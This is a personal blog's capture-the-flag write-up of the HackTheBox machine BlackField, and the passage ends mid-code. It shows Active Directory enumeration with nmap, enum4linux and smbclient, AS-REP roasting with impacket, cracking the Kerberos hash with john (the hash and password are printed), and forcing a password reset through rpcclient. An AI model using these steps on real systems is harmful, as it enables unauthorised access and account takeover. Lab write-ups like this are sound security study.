<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox BlackField Writeup | cantchasee</title><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="HackTheBox BlackField Writeup" /><meta name="author" content="cantchasee" /><meta property="og:locale" content="en_US" /><meta name="description" content="Hello guys, BlackField is a hard HTB machine but it’s really funny I think it’s the best box i’ve ever done so here is the writeup :)" /><meta property="og:description" content="Hello guys, BlackField is a hard HTB machine but it’s really funny I think it’s the best box i’ve ever done so here is the writeup :)" /><link rel="canonical" href="https://cantchasee.github.io/posts/HTB-BlackField-Writeup/" /><meta property="og:url" content="https://cantchasee.github.io/posts/HTB-BlackField-Writeup/" /><meta property="og:site_name" content="cantchasee" /><meta property="og:image" content="https://cantchasee.github.io/assets/img/blackfield_logo.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-25T00:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://cantchasee.github.io/assets/img/blackfield_logo.png" /><meta property="twitter:title" content="HackTheBox BlackField Writeup" /><meta name="twitter:site" content="@can_tcha" /><meta name="twitter:creator" content="@cantchasee" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"cantchasee"},"description":"Hello guys, BlackField is a hard HTB machine but it’s really funny I think it’s the best box i’ve ever done so here is the writeup :)","url":"https://cantchasee.github.io/posts/HTB-BlackField-Writeup/","headline":"HackTheBox BlackField Writeup","dateModified":"2020-08-25T00:00:00+01:00","@type":"BlogPosting","datePublished":"2020-08-25T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://cantchasee.github.io/posts/HTB-BlackField-Writeup/"},"image":"https://cantchasee.github.io/assets/img/blackfield_logo.png","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">cantchasee</a></div><div class="site-subtitle font-italic">A blog with posts :P.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/unlock/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>UNLOCK POST</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/whoami/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/Cantchasee" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/can_tcha" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/148910" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox BlackField Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox BlackField Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Aug 25, 2020, 12:00 AM +0100" > Aug 25 <i class="unloaded">2020-08-25T00:00:00+01:00</i> </span> by <span class="author"> cantchasee </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Oct 4, 2020, 2:38 PM +0100" > Oct 4 <i class="unloaded">2020-10-04T14:38:26+01:00</i> </span></div></div><div class="post-content"> <img src="/assets/img/blackfield_logo.png" class="post-preview-img"><p>Hello guys, BlackField is a hard HTB machine but it’s really funny I think it’s the best box i’ve ever done so here is the writeup :)</p><h2 id="recon">Recon</h2><p>So at always we start with an nmap scan</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>nmap <span class="nt">-A</span> 10.10.10.192

Nmap scan report <span class="k">for </span>10.10.10.192
Host is up <span class="o">(</span>0.088s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 993 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    <span class="nb">bind
</span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-08-14 01:55:30Z<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>8/13%Time<span class="o">=</span>5F358CB0%P<span class="o">=</span>x86_64-unknown-linux-gnu%r
SF:<span class="o">(</span>DNSVersionBindReqTCP,20,<span class="s2">"</span><span class="se">\0\x</span><span class="s2">1e</span><span class="se">\0\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">04</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\0\0\0\0\x</span><span class="s2">07ver
SF:sion</span><span class="se">\x</span><span class="s2">04bind</span><span class="se">\0\0\x</span><span class="s2">10</span><span class="se">\0\x</span><span class="s2">03"</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m50s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2020-08-14T01:57:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned 

</pre></table></code></div></div><p>we used the <code class="language-plaintext highlighter-rouge">-A</code> flag so nmap scan top 1000 port and give us open ports with detailed info about version so as you can see the machine have a lot of open ports but most importantly we see that we have <code class="language-plaintext highlighter-rouge">LDAP</code> and <code class="language-plaintext highlighter-rouge">Kerberos</code> are listening wich mean that we are facing <code class="language-plaintext highlighter-rouge">Active Directory</code> well AD is a very huge topic so if you’re intersted google it :D whenever I face an Active Directory environement I start with running <code class="language-plaintext highlighter-rouge">enum4linux</code> so after running it I got :</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>enum4linux-ng 10.10.10.192

 <span class="o">==========================</span>
|    Target Information    |
 <span class="o">==========================</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target ........... 10.10.10.192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Username ......... <span class="s1">''</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Random Username .. <span class="s1">'rfyirezt'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Password ......... <span class="s1">''</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> RID Range<span class="o">(</span>s<span class="o">)</span> ..... 500-550,1000-1050
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Known Usernames .. <span class="s1">'administrator,guest,krbtgt,domain admins,root,bin,none'</span>

 <span class="o">=====================================================</span>
|    Getting information via LDAP <span class="k">for </span>10.10.10.192    |
 <span class="o">=====================================================</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying LDAP <span class="o">(</span><span class="nb">timeout</span>: 5s<span class="o">)</span>
<span class="o">[</span>+] Appears to be root/parent DC
<span class="o">[</span>+] Long domain name is: BLACKFIELD.local

 <span class="o">==============================================</span>
|    Getting NetBIOS names <span class="k">for </span>10.10.10.192    |
 <span class="o">==============================================</span>
<span class="o">[</span>-] Could not get NetBIOS names information via <span class="s1">'nmblookup'</span>: host does not reply

 <span class="o">=====================================</span>
|    Session check on 10.10.10.192    |
 <span class="o">=====================================</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Check <span class="k">for </span>null session
<span class="o">[</span>+] Server allows session using username <span class="s1">''</span>, password <span class="s1">''</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Check <span class="k">for </span>random user session
<span class="o">[</span>+] Server allows session using username <span class="s1">'rfyirezt'</span>, password <span class="s1">''</span>
<span class="o">[</span>+] Re-running enumeration with user <span class="s1">'rfyirezt'</span> might give more results.

 <span class="o">===================================================</span>
|    Getting domain information <span class="k">for </span>10.10.10.192    |
 <span class="o">===================================================</span>
<span class="o">[</span>+] Domain: BLACKFIELD
<span class="o">[</span>+] SID: S-1-5-21-4194615774-2175524697-3563712290
<span class="o">[</span>+] Host is part of a workgroup <span class="o">(</span>not a domain<span class="o">)</span>

 <span class="o">======================================</span>
|    OS information on 10.10.10.192    |
 <span class="o">======================================</span>
<span class="o">[</span>-] Could not get OS info via <span class="s1">'srvinfo'</span>: NT_STATUS_ACCESS_DENIED

 <span class="o">=============================</span>
|    Users on 10.10.10.192    |
 <span class="o">=============================</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerating <span class="nb">users</span>
<span class="o">[</span>-] Could not find <span class="nb">users </span>via <span class="s1">'querydispinfo'</span>: NT_STATUS_ACCESS_DENIED
<span class="o">[</span>-] Could not find <span class="nb">users </span>via <span class="s1">'enumdomusers'</span>: NT_STATUS_ACCESS_DENIED

 <span class="o">==============================</span>
|    Groups on 10.10.10.192    |
 <span class="o">==============================</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerating <span class="nb">groups</span>
<span class="o">[</span>-] Could not get <span class="nb">groups </span>via <span class="s1">'enumalsgroups domain'</span>: NT_STATUS_ACCESS_DENIED
<span class="o">[</span>-] Could not get <span class="nb">groups </span>via <span class="s1">'enumalsgroups builtin'</span>: NT_STATUS_ACCESS_DENIED
<span class="o">[</span>-] Could not get <span class="nb">groups </span>via <span class="s1">'enumdomgroups'</span>: NT_STATUS_ACCESS_DENIED

 <span class="o">=========================================</span>
|    Share enumeration on 10.10.10.192    |
 <span class="o">=========================================</span>
<span class="o">[</span>+] Found 0 share<span class="o">(</span>s<span class="o">)</span> <span class="k">for </span>user <span class="s1">''</span> with password <span class="s1">''</span>, try a different user

 <span class="o">===========================================</span>
|    Policy information <span class="k">for </span>10.10.10.192    |
 <span class="o">===========================================</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying port 139/tcp <span class="o">(</span><span class="nb">timeout</span>: 5s<span class="o">)</span>
<span class="o">[</span>-] DCE/SAMR named pipe connect failed on port 139/tcp
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying port 445/tcp <span class="o">(</span><span class="nb">timeout</span>: 5s<span class="o">)</span>
<span class="o">[</span>-] SamrConnect2<span class="o">()</span> call failed on port 445/tcp

 <span class="o">=============================================</span>
|    Getting printer info <span class="k">for </span>10.10.10.192    |
 <span class="o">=============================================</span>
<span class="o">[</span>-] Could not get printer info via <span class="s1">'enumprinters'</span>: NT_STATUS_ACCESS_DENIED

Completed after 155.38 seconds

</pre></table></code></div></div><p>Epic Fail I’ve got nothing :( so it’s time for manual enumeration</p><blockquote><p>Edit: as <a href="https://www.hackthebox.eu/home/users/profile/211159">cddmp</a> stated the enumlinux-ng script actually didn’t fail sorry my mistake as you see the server allow random user session so if we rerun enumeration with it we must’ve got shares</p></blockquote><p>Let’s start seeing if we can access smb</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>smbclient <span class="nt">-N</span> <span class="nt">-L</span> 10.10.10.192

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	C<span class="nv">$ </span>             Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles<span class="nv">$ </span>      Disk      
	SYSVOL          Disk      Logon server share 
</pre></table></code></div></div><p>I added <code class="language-plaintext highlighter-rouge">-N</code> flag to try login <s>as anonymous</s> with no password and the <code class="language-plaintext highlighter-rouge">-L</code> flag to list smb shares so we’ve got a lot of interesting shares but two seems very interesting the <code class="language-plaintext highlighter-rouge">profiles$</code> share and <code class="language-plaintext highlighter-rouge">forensic</code> share let’s try accessing <code class="language-plaintext highlighter-rouge">forensic</code> share</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>smbclient <span class="nt">-N</span> <span class="se">\\\\</span>10.10.10.192<span class="se">\\</span>forensic
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir
</span>NT_STATUS_ACCESS_DENIED listing <span class="se">\*</span>
smb: <span class="se">\&gt;</span> 
</pre></table></code></div></div><p>So we can’t list it contents :( let’s move to the other share</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>smbclient <span class="nt">-N</span> <span class="se">\\\\</span>10.10.10.192<span class="se">\\</span>profiles<span class="err">$</span>
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Wed Jun  3 17:47:12 2020
  ..                                  D        0  Wed Jun  3 17:47:12 2020
  AAlleni                             D        0  Wed Jun  3 17:47:11 2020
  ABarteski                           D        0  Wed Jun  3 17:47:11 2020
  ABekesz                             D        0  Wed Jun  3 17:47:11 2020
  ABenzies                            D        0  Wed Jun  3 17:47:11 2020
<span class="nb">.</span>
<span class="nb">.</span>
<span class="nb">.</span>
<span class="nb">.</span>
</pre></table></code></div></div><p>I removed some results cuz we’ve got alot of words we’re in a share named profiles so maybe they’re usernames let’s first put them in a file:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>smbclient <span class="nt">-N</span> <span class="se">\\\\</span>10.10.10.192<span class="se">\\</span>profiles<span class="nv">$ </span><span class="nt">-c</span> <span class="s1">'dir'</span> | <span class="nb">awk</span> <span class="s1">'{ print $1 }'</span> <span class="o">&gt;</span> usernames
</pre></table></code></div></div><h2 id="getting-some-creds">Getting some creds</h2><p>and then since the server have kerberos let’s try seeing if there is a user who have the <code class="language-plaintext highlighter-rouge">Do not require Kerberos preauthentication</code> attribute if we found one we can crack their TGT and get their password for that we will need impacket it’s simple to install it just google it and then add impacket scripts to your PATH or just run it from their directory:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>GetNPUsers.py BLACKFIELD.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> usernames | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'UNKNOWN'</span>
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span>-] User audit2020 doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:d4f82bd289c817d164c8d78a79115c94$966acba680105f62c1fb50bf66bcd953eceadc24ce7303018ede6a7630a699dad7c5d6fcb64f0e11e377f757e7c8f8e5727a8ce7d8809ef0093dad158acc91c176d910844302f3a0ef0940ed30e14994792a7a449fe6c95f6f15a20fddb38c5e10a57c313fb1b0af9245d5ae9e2492bcf5673f2e5faf6193b9901b350bcfc2f6dec767460ab96fd4bb28108f7ae5597a64019277c3bd6e0bd3daeda0ab6dd1334ab3393c30494f4d986bdd329c7950797b1f522e18b3e818b974f028a695764abdd57a9d1262ea9f4e0932bd8f003f41f4fdd0571c9d620d3abb29b4153e716d86dfb584505d77452ddd82a45bdfd8b139ff668b
[-] User svc_backup doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>

</pre></table></code></div></div><p>I’ve added <code class="language-plaintext highlighter-rouge">| grep -v 'UNKNOWN'</code> to remove error message that says the user isn’t in the database as you can see we’ve got a hash wich appear for the support user so I put it in a file name <code class="language-plaintext highlighter-rouge">support_krb_hash</code> and then crack it with john using</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>~/rockyou.txt support_krb_hash
Warning: detected <span class="nb">hash type</span> <span class="s2">"krb5asrep"</span>, but the string is also recognized as <span class="s2">"krb5asrep-aes-opencl"</span>
Use the <span class="s2">"--format=krb5asrep-aes-opencl"</span> option to force loading these as that <span class="nb">type </span>instead
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
0g 0:00:00:46 44.75% <span class="o">(</span>ETA: 16:55:36<span class="o">)</span> 0g/s 141550p/s 141550c/s 141550C/s klaham..kla4stunde
0g 0:00:01:01 60.77% <span class="o">(</span>ETA: 16:55:34<span class="o">)</span> 0g/s 143436p/s 143436c/s 143436C/s dat1nonly..dastivje4
0g 0:00:01:04 64.07% <span class="o">(</span>ETA: 16:55:33<span class="o">)</span> 0g/s 143736p/s 143736c/s 143736C/s cfe23028119..cfcbaby
0g 0:00:01:25 86.06% <span class="o">(</span>ETA: 16:55:32<span class="o">)</span> 0g/s 145596p/s 145596c/s 145596C/s 441021239..440925306
<span class="c">#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD)</span>
1g 0:00:01:38 DONE <span class="o">(</span>2020-08-25 16:55<span class="o">)</span> 0.01018g/s 146036p/s 146036c/s 146036C/s <span class="c">#13Carlyn..#*burberry#*1990</span>
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>and now let’s see our cracked password</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>john <span class="nt">--show</span> support_krb_hash 
<span class="nv">$krb5asrep$23$support</span>@BLACKFIELD:#00^BlackKnight

1 password <span class="nb">hash </span>cracked, 0 left
</pre></table></code></div></div><p>and now we’ve got a password after trying it it appear that we can’t do a lot we can login to smb but our user can’t do alot so let’s check <code class="language-plaintext highlighter-rouge">rpcclient</code></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>rpcclient <span class="nt">-U</span> support 10.10.10.192
Enter WORKGROUP<span class="se">\s</span>upport<span class="s1">'s password: 
rpcclient $&gt; 

</span></pre></table></code></div></div><p>so we can use rpcclient but from there I was stuck after getting a little hint it appears that we can change AD users password so let’s try it</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> setuserinfo
Usage: setuserinfo username level password <span class="o">[</span>password_expired]
result was NT_STATUS_INVALID_PARAMETER
rpcclient <span class="nv">$&gt;</span> setuserinfo svc_backup 23 p@ssw0rd123
result: NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
rpcclient <span class="nv">$&gt;</span> setuserinfo Administrator 23 p@ssw0rd123
result: NT_STATUS_ACCESS_DENIED
result was NT_STATUS_ACCESS_DENIED
rpcclient <span class="nv">$&gt;</span> 
</pre></table></code></div></div><p>Of course as you see we can’t change password of any administrator or high priv account you can read more in this <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/">awesome article</a> after that I found that we can change audit2020 password let’s try it</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>
rpcclient <span class="nv">$&gt;</span> setuserinfo audit2020 23 p@ssw0rd123
rpcclient <span class="nv">$&gt;</span>
</pre></table></code></div></div><p>Hahaha :D no error it means that it worked let’s check that we changed the user password by trying to log in samba</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
